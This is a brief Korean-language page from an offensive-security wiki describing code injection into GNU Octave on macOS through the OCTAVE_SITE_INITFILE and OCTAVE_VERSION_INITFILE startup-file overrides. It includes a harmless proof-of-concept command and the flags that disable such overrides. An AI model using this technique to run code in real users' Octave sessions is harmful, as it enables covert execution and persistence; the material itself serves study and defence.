# macOS GNU Octave Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave는 시작 중 유효한 Octave 명령이 포함된 여러 파일을 실행합니다. `OCTAVE_SITE_INITFILE`은 site-wide startup file을 재정의하고 `OCTAVE_VERSION_INITFILE`은 version-specific startup file을 재정의하므로, 두 변수 중 하나를 사용해 자동 실행을 attacker가 읽을 수 있는 파일로 redirect할 수 있습니다.<sup>[[1]](#references)</sup>
```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```
`--no-init-file`은 `~/.octaverc`와 같은 사용자 파일만 건너뛰며, 위의 site-file override는 중지하지 **않습니다**. site files에는 `--no-site-file`을 사용하고, 모든 startup files를 비활성화하려면 `--norc` / `-f`를 사용하세요.<sup>[[2]](#references)</sup>

## References

- [1] [GNU Octave Startup Files](https://docs.octave.org/latest/Startup-Files.html)
- [2] [GNU Octave Command Line Options](https://docs.octave.org/latest/Command-Line-Options.html)
{{#include ../../../banners/hacktricks-training.md}}
